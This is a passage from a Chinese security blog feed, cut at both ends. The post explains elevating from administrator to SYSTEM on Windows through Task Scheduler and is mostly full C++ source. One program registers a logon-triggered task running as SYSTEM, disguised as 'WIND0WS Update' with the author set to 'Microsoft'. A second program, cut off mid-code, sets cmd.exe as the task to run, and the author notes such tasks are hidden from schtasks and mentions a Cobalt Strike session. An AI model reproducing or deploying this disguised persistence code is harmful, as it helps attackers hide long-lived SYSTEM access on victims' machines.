NetScheduleJobAdd(<span class="literal">NULL</span>, LPBYTE(&amp;ai), &amp;JobId) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="comment">//if (ret == ERROR_SUCCESS)</span></span><br><span class="line">      <span class="comment">//  std::cout &lt;&lt; " SUCCESS!!" &lt;&lt; std::endl;</span></span><br><span class="line">    <span class="comment">//else</span></span><br><span class="line">     <span class="comment">//   std::cout &lt;&lt; "Error" &lt;&lt; std::endl;</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span>&#123;</span><br><span class="line">    Jobadd();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/qq_38777624/article/details/109217325" target="_blank" rel="noopener">Windows 注册表相关API总结</a></p><p><a href="https://www.cxymm.net/article/yurnero123/41080367" target="_blank" rel="noopener">几个修改注册表后立即生效的刷新方法</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;书接上回嘿嘿&lt;/p&gt;</summary>
    
    
    
    <category term="win" scheme="https://chenzidu.github.io/categories/win/"/>
    
    
    <category term="C++" scheme="https://chenzidu.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>C++提权的几种方式(win)(一)</title>
    <link href="https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>https://chenzidu.github.io/2022/02/09/C-%E6%8F%90%E6%9D%83%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E5%BC%8F/</id>
    <published>2022-02-09T09:32:05.000Z</published>
    <updated>2024-03-11T07:48:09.663Z</updated>
    
    <content type="html"><![CDATA[<p>之前在学校的时候打acm用的C++，不过没学过底层的东西。没想到竟然有一天，会拿着C++看算法以外的东西。提到权的那一刻是真爽啊！下面只给了Task Scheduler 2.0的图，其他的图忘记截了&#x3D; &#x3D;</p><a id="more"></a><h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><p><b>Q：Task schduler是什么?</b></p><p>A：Task schduler：任务调度程序，可以理解他的作用跟 Linux 下的 Crontab 作用类似，但是要比 Linux Crontab 强大很多。不单单可以执行定时任务，还可以根据某些特定的条件来启动其他应用，发送电子邮件等任务。</p><p><b>Q：为什么提的权限要是SYSTEM账户?</b></p><p>A：SYSTEM 用户和使用普通管理员用户对于文件有同样的特权。系统帐户可以由 Windows 下执行的服务和操作系统使用。有很多服务和 Windows 进程须要可以在内部登录（比如在 Windows 安装过程中）而系统帐户就是为该目的设计的；它是内部帐户，不显示在用户管理器，也无法加入到不论什么组，而且不能分配用户权限。可是对于一些服务和进程，我们须要使用系统账户而非管理员账户，由于这些服务和进程要和系统交互，须要内部登录。</p><p>在运行计划任务的时候，假设我们使用NT AUTHORITY\SYSTEM 账户，是不须要输入密码的。如果使用了其他管理员账户，我们必须输入密码。一般我们使用系统账户，主要是为了防止管理员改变密码后任务无法运行。</p><hr><p><b>关于计划任务的设定，可以参考这篇文章<a href="https://docs.microsoft.com/zh-cn/windows/win32/taskschd/security-contexts-for-running-tasks" target="_blank" rel="noopener">任务的安全上下文</a>，例如 Administrators 组或 SYSTEM 帐户的成员可以读取、更新、删除和运行任何任务。 “用户”组、LocalService 帐户和 NetworkService 帐户的成员只能读取、更新、删除和运行已创建的任务。</b></p><hr><h1 id="C-Task-Scheduler-2-0提权"><a href="#C-Task-Scheduler-2-0提权" class="headerlink" title="C++ Task Scheduler 2.0提权"></a>C++ Task Scheduler 2.0提权</h1><h3 id="注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。"><a href="#注意：客户端需要-Windows-Vista-或更高版本。服务器需要-Windows-Server-2008-或更高版本。必须要管理员权限才可以运行添加计划任务。" class="headerlink" title="注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。"></a>注意：客户端需要 Windows Vista 或更高版本。服务器需要 Windows Server 2008 或更高版本。必须要管理员权限才可以运行添加计划任务。</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;comdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wincred.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;taskschd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"taskschd.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"comsupp.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"credui.lib"</span>)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">wmain</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 初始化COM</span></span><br><span class="line">    HRESULT hr = CoInitializeEx(<span class="literal">NULL</span>, COINIT_MULTITHREADED);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\nCoInitializeEx failed: %x"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 注册安全性并设置该过程的默认安全性值。</span></span><br><span class="line">    hr = CoInitializeSecurity(</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">-1</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,</span><br><span class="line">        RPC_C_IMP_LEVEL_IMPERSONATE,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="literal">NULL</span>);</span><br><span class="line">    LPCWSTR wszTaskName = <span class="string">L"WIND0WS Update"</span>; <span class="comment">//设置计划任务名称</span></span><br><span class="line">    <span class="comment">//创建ITaskService的实例</span></span><br><span class="line">    ITaskService* pService = <span class="literal">NULL</span>;</span><br><span class="line">    hr = CoCreateInstance(CLSID_TaskScheduler,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        CLSCTX_INPROC_SERVER,</span><br><span class="line">        IID_ITaskService,</span><br><span class="line">        (<span class="keyword">void</span>**)&amp;pService);</span><br><span class="line">    <span class="comment">// 链接到任务实例</span></span><br><span class="line">    hr = pService-&gt;Connect(<span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>(),</span><br><span class="line">        <span class="keyword">_variant_t</span>(), <span class="keyword">_variant_t</span>());</span><br><span class="line">    <span class="comment">//     获取指向根任务文件夹的指针。</span></span><br><span class="line">    ITaskFolder* pRootFolder = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;GetFolder(<span class="keyword">_bstr_t</span>(<span class="string">L"\\"</span>), &amp;pRootFolder);</span><br><span class="line">    <span class="comment">//  如果存在相同的任务删除该任务</span></span><br><span class="line">    pRootFolder-&gt;DeleteTask(<span class="keyword">_bstr_t</span>(wszTaskName), <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//  创建任务生成器对象以创建任务。</span></span><br><span class="line">    ITaskDefinition* pTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pService-&gt;NewTask(<span class="number">0</span>, &amp;pTask);</span><br><span class="line">    pService-&gt;Release();  <span class="comment">//清理Com</span></span><br><span class="line">    <span class="comment">// 获取注册信息</span></span><br><span class="line">    IRegistrationInfo* pRegInfo = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_RegistrationInfo(&amp;pRegInfo);</span><br><span class="line">    hr = pRegInfo-&gt;put_Author((<span class="keyword">_bstr_t</span>)<span class="string">"Microsoft"</span>);                                <span class="comment">// 修改你想要改的计划任务创建者</span></span><br><span class="line">    <span class="comment">//  创建计划任务设置</span></span><br><span class="line">    ITaskSettings* pSettings = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Settings(&amp;pSettings);</span><br><span class="line">    <span class="comment">//      设置任务的设置值</span></span><br><span class="line">    hr = pSettings-&gt;put_StartWhenAvailable(VARIANT_TRUE);</span><br><span class="line">    pSettings-&gt;Release();</span><br><span class="line">    <span class="comment">//  ------------------------------------------------------</span></span><br><span class="line">    <span class="comment">//  获取取触发器集合以插入登录触发器。</span></span><br><span class="line">    ITriggerCollection* pTriggerCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Triggers(&amp;pTriggerCollection);</span><br><span class="line">    <span class="comment">//  添加触发器</span></span><br><span class="line">    ITrigger* pTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTriggerCollection-&gt;Create(TASK_TRIGGER_LOGON, &amp;pTrigger);   <span class="comment">//TASK_TRIGGER_EVENT    事件触发</span></span><br><span class="line">    pTriggerCollection-&gt;Release();</span><br><span class="line">    ILogonTrigger* pLogonTrigger = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTrigger-&gt;QueryInterface(</span><br><span class="line">        IID_ILogonTrigger, (<span class="keyword">void</span>**)&amp;pLogonTrigger);</span><br><span class="line">    pTrigger-&gt;Release();</span><br><span class="line">    hr = pLogonTrigger-&gt;put_Id(<span class="keyword">_bstr_t</span>(<span class="string">L"Trigger1"</span>));</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //设置指定触发时间 如果不设置 代表任何时间都可以触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_StartBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_EndBoundary( _bstr_t(L"2020-10-30T08:00:00") );</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    //  定义某个用户 登录时触发 注释掉代表所有用户登录后触发</span></span><br><span class="line"><span class="comment">    hr = pLogonTrigger-&gt;put_UserId( _bstr_t( L"administrator" ) );   //某用户登录后触发 设置某用户</span></span><br><span class="line"><span class="comment">    pLogonTrigger-&gt;Release();</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">    IActionCollection* pActionCollection = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pTask-&gt;get_Actions(&amp;pActionCollection);</span><br><span class="line">    IAction* pAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pActionCollection-&gt;Create(TASK_ACTION_EXEC, &amp;pAction); <span class="comment">//触发程序执行：TASK_ACTION_EXEC</span></span><br><span class="line">    IExecAction* pExecAction = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pAction-&gt;QueryInterface(</span><br><span class="line">        IID_IExecAction, (<span class="keyword">void</span>**)&amp;pExecAction);</span><br><span class="line">    <span class="built_in">string</span> cmdName;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">"输入文件位置：\n"</span>;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; cmdName;</span><br><span class="line">    hr = pExecAction-&gt;put_Path(<span class="keyword">_bstr_t</span>(cmdName.c_str()));</span><br><span class="line">    pExecAction-&gt;Release();</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">" 无法设置程序执行路径: %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    IRegisteredTask* pRegisteredTask = <span class="literal">NULL</span>;</span><br><span class="line">    hr = pRootFolder-&gt;RegisterTaskDefinition(</span><br><span class="line">        <span class="keyword">_bstr_t</span>(wszTaskName),</span><br><span class="line">        pTask,</span><br><span class="line">        TASK_CREATE_OR_UPDATE,  <span class="comment">// 创建并覆盖现有的计划任务：TASK_CREATE_OR_UPDATE </span></span><br><span class="line">                                                        <span class="comment">//仅更新：TASK_UPDATE</span></span><br><span class="line">                                                        <span class="comment">//仅创建：TASK_CREATE</span></span><br><span class="line">                                                        <span class="comment">//禁用：TASK_DISABLE</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L"system"</span>),  <span class="comment">// 启动身份 system 或者administrator </span></span><br><span class="line">        <span class="keyword">_variant_t</span>(),</span><br><span class="line">        TASK_LOGON_GROUP, <span class="comment">//登录技术  组激活：TASK_LOGON_GROUP 用户登录后激活：TASK_LOGON_INTERACTIVE_TOKEN</span></span><br><span class="line">        <span class="keyword">_variant_t</span>(<span class="string">L""</span>),</span><br><span class="line">        &amp;pRegisteredTask);</span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n无法保存计划任务 : %x"</span>, hr);</span><br><span class="line">        pRootFolder-&gt;Release();</span><br><span class="line">        pTask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Success！成功注册计划任务 "</span>);</span><br><span class="line">    pRootFolder-&gt;Release();</span><br><span class="line">    pTask-&gt;Release();</span><br><span class="line">    pRegisteredTask-&gt;Release();</span><br><span class="line">    CoUninitialize();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，把绝对路径输入后，成功提权至system,非常的爽</p><p>![cs](cs.png %}</p><h1 id="C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）"><a href="#C-Task-Scheduler-1-0写入提权（利用COM组件的-API-编程创建计划任务）" class="headerlink" title="C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）"></a>C++ Task Scheduler 1.0写入提权（利用COM组件的 API 编程创建计划任务）</h1><h3 id="注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。"><a href="#注意：Task-Scheduler-1-0是在C-Windows-Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要-Windows-Vista-或-Windows-XP。服务器需要-Windows-Server-2008-或-Windows-Server-2003。" class="headerlink" title="注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。"></a>注意：Task Scheduler 1.0是在C:\Windows\Tasks目录下生成job文件，如果job文件存在重复会报错，注意及时删除。客户端需要 Windows Vista 或 Windows XP。服务器需要 Windows Server 2008 或 Windows Server 2003。</h3><h3 id="使用-Task-Scheduler-1-0-的几个注意点："><a href="#使用-Task-Scheduler-1-0-的几个注意点：" class="headerlink" title="使用 Task Scheduler 1.0 的几个注意点："></a>使用 Task Scheduler 1.0 的几个注意点：</h3><ul><li>创建计划任务需要管理员权限。</li><li>必须确保 Task Scheduler service 正在运行。</li><li>通过 COM 组件创建的计划任务,会在C:\windows\Tasks目录下创建一个同名的 JOB 文件。</li><li>同时需要为计划任务指定一个唯一的名称，如果指定的名称已被使用，则会导致任务创建失败。</li><li>该计划任务无法通过 schtasks 命令查询。</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;initguid.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ole2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;mstask.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;msterr.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;objidl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;wchar.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> <span class="meta-keyword">warning</span>(disable : 4996)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">WGetUserName</span><span class="params">(WCHAR* username, <span class="keyword">int</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 获取并显示计算机的名称。</span></span><br><span class="line">    <span class="keyword">char</span>   szName[<span class="number">255</span>];</span><br><span class="line">    ULONG   nLen = <span class="keyword">sizeof</span>(szName);</span><br><span class="line">    ::GetUserNameA(szName, &amp;nLen);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(szName); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        username[i] = szName[i];</span><br><span class="line">    &#125;</span><br><span class="line">    username[<span class="built_in">strlen</span>(szName)] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, szName);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    HRESULT hr = S_OK;</span><br><span class="line">    ITaskScheduler* pITS;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用CoInitialize初始化COM库，然后  </span></span><br><span class="line">    <span class="comment">//调用CoCreateInstance获取Task Scheduler对象。  </span></span><br><span class="line">    hr = CoInitialize(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (SUCCEEDED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        hr = CoCreateInstance(CLSID_CTaskScheduler,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            CLSCTX_INPROC_SERVER,</span><br><span class="line">            IID_ITaskScheduler,</span><br><span class="line">            (<span class="keyword">void</span>**)&amp;pITS);</span><br><span class="line">        <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">        &#123;</span><br><span class="line">            CoUninitialize();</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/// 获取计算机的用户名</span></span><br><span class="line">    WCHAR username[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">memset</span>(username, <span class="number">0</span>, <span class="keyword">sizeof</span>(username));</span><br><span class="line">    WGetUserName(username, <span class="keyword">sizeof</span>(username));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用ITaskScheduler::NewWorkItem创建新任务。  </span></span><br><span class="line">    WCHAR pwszTaskName[<span class="number">512</span>] = <span class="string">L"Test_Task"</span>;</span><br><span class="line">    ITask* pITask;</span><br><span class="line"></span><br><span class="line">    wcscat(pwszTaskName, username);</span><br><span class="line">    hr = pITS-&gt;NewWorkItem(pwszTaskName,         <span class="comment">// 任务名称</span></span><br><span class="line">        CLSID_CTask,          <span class="comment">// 类标识符</span></span><br><span class="line">        IID_ITask,            <span class="comment">// 接口标识符</span></span><br><span class="line">        (IUnknown**)&amp;pITask); <span class="comment">// 解决的任务</span></span><br><span class="line">    <span class="comment">//    接口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pITS-&gt;Release();          <span class="comment">// 释放对象</span></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Failed calling NewWorkItem, error = 0x%x\n"</span>, hr);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//调用ITask::SetApplicationName指定应用程序的名称</span></span><br><span class="line">    <span class="comment">//测试任务。</span></span><br><span class="line">    LPCWSTR pwszApplicationName = <span class="string">L"C:\\Windows\\System32\\cmd.exe "</span>;</span><br><span class="line">    hr = pITask-&gt;SetApplicationName(pwszApplicationName);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (FAILED(hr))</span><br><span class="line">    &#123;</span><br><span class="line">        wprintf(<span class="string">L"Failed calling ITask::SetApplicationName: "</span>);</span><br><span class="line">        wprintf(<span class="string">L"error = 0x%x\n"</span>, hr);</span><br><span class="line">        pITask-&gt;Release();</span><br><span class="line">        CoUninitialize();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span 